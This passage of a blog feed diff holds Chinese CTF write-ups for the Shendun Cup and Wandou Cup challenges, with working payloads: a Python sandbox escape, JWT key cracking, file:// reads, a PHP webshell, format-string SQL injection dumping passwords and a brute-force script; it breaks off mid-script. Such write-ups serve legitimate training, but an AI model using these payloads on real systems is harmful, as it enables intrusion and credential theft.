+import base64 x = &amp;#39;v6&amp;#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&amp;#39; y = &amp;#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&amp;#39; z = &amp;#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&amp;#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&amp;#39; a, b = x.split(&amp;#39;:&amp;#39;) c, d = y.split(&amp;#39;:&amp;#39;) e, f = z.split(&amp;#39;:&amp;#39;) b = base64.b64decode(b) d = base64.b64decode(d) f = base64.b64decode(f) g = base64.b64decode(&amp;#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&amp;#39;) flag = &amp;#39;&amp;#39; for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag += chr(ord(g[i]) ^ t) print(flag) FLAG值：</description>
+      <content>&lt;p&gt;&lt;strong&gt;首届“神盾杯”上海市网络安全竞赛&lt;/strong&gt;，去年的比赛。&lt;/p&gt;
+&lt;h1 id=&#34;0x00-babyjs&#34;&gt;0x00 babyJS&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看源码 找不到被调用的&lt;code&gt;CheckLogin&lt;/code&gt;函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun///image1.png&#34; alt=&#34;/img/19shendun/image1.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;看到&lt;strong&gt;script&lt;/strong&gt;中有用到&lt;code&gt;unespace&lt;/code&gt;和&lt;code&gt;escape&lt;/code&gt;等函数 用于编码字符串&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;eval&lt;/code&gt;传参改为&lt;code&gt;alert&lt;/code&gt; 显示为弹窗&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image2.png&#34; alt=&#34;/img/19shendun/image2.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现&lt;code&gt;check&lt;/code&gt;函数 并将flag与用户输入做比较 得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image3.png&#34; alt=&#34;/img/19shendun/image3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{a5a5f402f6dc62acd3e848900a17513f}&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x01-crypto_easy_1&#34;&gt;0x01 crypto_easy_1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;下载文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image4.png&#34; alt=&#34;/img/19shendun/image4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现3行类似的数据 并且长度一致。&lt;/p&gt;
+&lt;p&gt;:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image5.png&#34; alt=&#34;/img/19shendun/image5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;长度一致 为42&lt;/p&gt;
+&lt;p&gt;异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag&lt;/p&gt;
+&lt;p&gt;解密脚本如下:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v6&amp;#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&amp;#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c, d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e, f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(b)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(d)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(f)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;  i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(a[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(b[i])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(g[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; t)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(flag)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{b80f908c-8226-11e9-8b28-88e9fe5197ac}&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x02-ez_gallery_1&#34;&gt;0x02 ez_gallery_1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看源码&lt;/p&gt;
+&lt;p&gt;提示flag位置&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image6.png&#34; alt=&#34;/img/19shendun/image6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到可以利用的url&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image7.png&#34; alt=&#34;/img/19shendun/image7.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用?截断1.jpg&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image8.png&#34; alt=&#34;/img/19shendun/image8.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{378346c7ac53d624a8621efc745bbeab}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;0x03 fast_calc_2&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;随便试了几下{1+1},{set},发现有点奇怪,猜测可能是python逃逸&lt;/p&gt;
+&lt;p&gt;尝试&lt;code&gt;dir(().__class__)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image9.png&#34; alt=&#34;/img/19shendun/image9.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试了一下网上的payload但是没有成功，发现存在过滤，过滤了&lt;code&gt;[]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;查到builtins是自动引入环境的&lt;code&gt;__builtins__.__dict__&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image10.png&#34; alt=&#34;/img/19shendun/image10.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查找资料通过pop绕过[]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image11.png&#34; alt=&#34;/img/19shendun/image11.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Payload为：&lt;code&gt;__builtins__.__dict__.pop(&#39;open&#39;)(&#39;/flag&#39;).readline()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image12.png&#34; alt=&#34;/img/19shendun/image12.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{4582900a19a6a8801399afb6a31d9bc0}&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x04-easyadmin&#34;&gt;0x04 Easyadmin&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;爆破下目录发现index.php~存在源码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image13.png&#34; alt=&#34;/img/19shendun/image13.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现srole==admin才能输出flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image14.png&#34; alt=&#34;/img/19shendun/image14.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登陆的后发现token为base64加密，解一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image15.png&#34; alt=&#34;/img/19shendun/image15.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image16.png&#34; alt=&#34;/img/19shendun/image16.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;搜索了一下jwt发现有加密，网上有类似的解法&lt;/p&gt;
+&lt;p&gt;下面网站可以验证&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://jwt.io/&#34;&gt;https://jwt.io/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image17.png&#34; alt=&#34;/img/19shendun/image17.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;有根据源码把guest改为admin&lt;/p&gt;
+&lt;p&gt;再看下源码，里面有一个key我们不知道，猜测需要爆破应该为4位&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image18.png&#34; alt=&#34;/img/19shendun/image18.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在github上找到一个脚本直接跑出来了&lt;a href=&#34;https://github.com/brendan-rius/c-jwt-cracker&#34;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image19.png&#34; alt=&#34;/img/19shendun/image19.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;保存下‘sjwt’&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image20.png&#34; alt=&#34;/img/19shendun/image20.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用这个新token替换一下成功获取flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image21.png&#34; alt=&#34;/img/19shendun/image21.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{11529a36dd607c45e5b104ed977247ed}&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x05-easyupload&#34;&gt;0x05 Easyupload&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;通过尝试发现在图片地址处输入 &lt;a href=&#34;&#34;&gt;file:///etc/passwd&lt;/a&gt;可以读到文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image22.png&#34; alt=&#34;/img/19shendun/image22.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image23.png&#34; alt=&#34;/img/19shendun/image23.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后在这卡了好久，在摸索后发现可以通过用/proc/self/cwd绕过，cwd是一个符号链接，指向了实际的工作目录&lt;/p&gt;
+&lt;p&gt;下图是一篇文章中的介绍&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image24.png&#34; alt=&#34;/img/19shendun/image24.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image25.png&#34; alt=&#34;/img/19shendun/image25.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造如下payload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image26.png&#34; alt=&#34;/img/19shendun/image26.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取到源码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image27.png&#34; alt=&#34;/img/19shendun/image27.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到他的命名规则&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image28.png&#34; alt=&#34;/img/19shendun/image28.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后通过上传php webshell获取flag&lt;/p&gt;
+&lt;p&gt;先上传一个phpinfo&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image29.png&#34; alt=&#34;/img/19shendun/image29.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;读到了文件但是没有执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image30.png&#34; alt=&#34;/img/19shendun/image30.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;想到通过&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image31.png&#34; alt=&#34;/img/19shendun/image31.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;phpinfo();&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image32.png&#34; alt=&#34;/img/19shendun/image32.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功执行&lt;/p&gt;
+&lt;p&gt;运行 &lt;code&gt;system(cat /flag)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image33.png&#34; alt=&#34;/img/19shendun/image33.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image34.png&#34; alt=&#34;/img/19shendun/image34.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{2742ab5468a78d70dca332ca48aa7b89}&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x06-easysqli&#34;&gt;0x06 Easysqli&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;操作内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;首先登陆pow直接在cmd5上解密下就行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image35.png&#34; alt=&#34;/img/19shendun/image35.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;一开始尝试各种绕过都不行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image36.png&#34; alt=&#34;/img/19shendun/image36.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;后来提示了一波&lt;code&gt;bypass addslashes&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;通过google搜索&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image37.png&#34; alt=&#34;/img/19shendun/image37.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;格式化字符串漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image38.png&#34; alt=&#34;/img/19shendun/image38.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到payload %1$&#39;&lt;/p&gt;
+&lt;p&gt;1．两张 &lt;code&gt;admin%1$&#39;%20union%20select%201,2%23&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image39.png&#34; alt=&#34;/img/19shendun/image39.png&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;查找表&lt;code&gt;admin%1$&#39;%20union%20select%20table_name,2%20from%20information_schema.tables%20where%20table_schema=database()%23&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;表名user&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image40.png&#34; alt=&#34;/img/19shendun/image40.png&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;code&gt;admin%1$&#39;%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_schema=database()%23&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;找到字段名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image41.png&#34; alt=&#34;/img/19shendun/image41.png&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;&lt;code&gt;admin%1$&#39;%20union%20select%20username,password%20from%20user%23&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在password中找到&lt;strong&gt;flag&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://vuln.top/img/19shendun/image42.png&#34; alt=&#34;/img/19shendun/image42.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FLAG值：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{299386fb699cff0cb99b1f57dee500a0}&lt;/strong&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>豌豆杯入学CTF</title>
+      <link>https://vuln.top/posts/wandouctf/</link>
+      <pubDate>Wed, 16 Oct 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/wandouctf/</guid>
+      <description>1.题目:小可爱 第一步肯定是绕过本地回环地址 一开始想到的是x-forward-for等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了referer成功绕过 这里没啥思路只能爆破 密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！ 将图片下载下来，用binwalk查看下发现有压缩包!foremost下得到压缩包发现有密码 这个地方解了很久发现使用Dilraba的md5。。。。 得到一张图片再一次foremost得到一个压缩包成功拿到flag 2.题目:单身二十年 &amp;lt;?php header(&amp;#34;Content-type:text/html;charset=utf-8&amp;#34;); show_source(__FILE__); if($_COOKIE[&amp;#39;token&amp;#39;]==&amp;#39;5D41402ABC4B2A76B9719D911017C592&amp;#39;){ $file = &amp;#39;dump/&amp;#39;.md5(base64_encode(mt_rand(1,100))).&amp;#39;.txt&amp;#39;; file_put_contents($file,file_get_contents(&amp;#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&amp;#39;)); sleep(10); unlink($file); }else{ header(&amp;#39;Location: index.php&amp;#39;); } setcookie(&amp;#34;token&amp;#34;); ?&amp;gt; 看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。 一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。 import base64 import hashlib import requests for i in range(1,101): headers = {&amp;#39;Content-type&amp;#39;:&amp;#39;text/html;charset=utf-8&amp;#39;} encodestr = base64.b64encode(str(i).encode(&amp;#39;utf-8&amp;#39;)) cookies = {&amp;#39;token&amp;#39;:&amp;#39;5D41402ABC4B2A76B9719D911017C592&amp;#39;} #print(encodestr) m = hashlib.md5() m.update(encodestr) #print(m.hexdigest()) a = m.hexdigest() url = &amp;#39;http://106.14.145.133:8081/web10/dump/&amp;#39;+a+&amp;#39;.txt&amp;#39; #print(url) url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2) #print(url_get.headers) #print(url_get.cookies) if url_get.</description>
+      <content>&lt;!-- raw HTML omitted --&gt;
+&lt;hr&gt;
+&lt;p&gt;1.题目:小可爱
+第一步肯定是绕过本地回环地址
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162152/4285938054.png&#34; alt=&#34;CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png&#34;&gt;
+一开始想到的是&lt;code&gt;x-forward-for&lt;/code&gt;等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了&lt;code&gt;referer&lt;/code&gt;成功绕过
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162315/1177985903.png&#34; alt=&#34;BC410D27-3BE1-40E5-ABF5-777F7144F502.png&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/366387116.png&#34; alt=&#34;AEA1A04B-27BA-4393-953B-75D948C95027.png&#34;&gt;
+这里没啥思路只能爆破
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2499653827.png&#34; alt=&#34;B9E617B3-EF26-477B-B78C-534C490FB3C4.png&#34;&gt;
+密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1630037561.png&#34; alt=&#34;122FC809-D249-4228-9EB5-1E7F101BB7C1.png&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/296032636.png&#34; alt=&#34;ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png&#34;&gt;
+将图片下载下来，用&lt;code&gt;binwalk&lt;/code&gt;查看下发现有压缩包!&lt;code&gt;foremost&lt;/code&gt;下得到压缩包发现有密码
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/RujlNg.png&#34; alt=&#34;70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2411784842.png&#34; alt=&#34;DABA844F-3716-4889-96CA-04A7E6137C96.png&#34;&gt;
+这个地方解了很久发现使用Dilraba的md5。。。。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2601915022.png&#34; alt=&#34;F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png&#34;&gt;
+得到一张图片再一次foremost得到一个压缩包成功拿到flag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2175607698.png&#34; alt=&#34;C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png&#34;&gt;
+2.题目:单身二十年
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1468141901.png&#34; alt=&#34;EA018BA0-F2BB-4204-9784-8E3585F3511B.png&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php 
+
+header(&amp;#34;Content-type:text/html;charset=utf-8&amp;#34;); 
+show_source(__FILE__); 
+if($_COOKIE[&amp;#39;token&amp;#39;]==&amp;#39;5D41402ABC4B2A76B9719D911017C592&amp;#39;){ 
+    $file    =    &amp;#39;dump/&amp;#39;.md5(base64_encode(mt_rand(1,100))).&amp;#39;.txt&amp;#39;; 
+    file_put_contents($file,file_get_contents(&amp;#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&amp;#39;)); 
+    sleep(10); 
+    unlink($file); 
+}else{ 
+    header(&amp;#39;Location: index.php&amp;#39;); 
+} 
+
+setcookie(&amp;#34;token&amp;#34;); 
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。
+一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3316060136.png&#34; alt=&#34;9BB9177B-2227-4784-A0BB-B029ED948AF3.png&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import base64
+import hashlib
+import requests
+for i in range(1,101):
+	headers = {&amp;#39;Content-type&amp;#39;:&amp;#39;text/html;charset=utf-8&amp;#39;}
+	encodestr = base64.b64encode(str(i).encode(&amp;#39;utf-8&amp;#39;))
+	cookies = {&amp;#39;token&amp;#39;:&amp;#39;5D41402ABC4B2A76B9719D911017C592&amp;#39;}
+	#print(encodestr)
+	m = hashlib.md5()
+	m.update(encodestr)
+	#print(m.hexdigest())
+	a = m.hexdigest()
+	url = &amp;#39;http://106.14.145.133:8081/web10/dump/&amp;#39;+a+&amp;#39;.txt&amp;#39;
+	#print(url)
+	url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)
+	#print(url_get.headers)
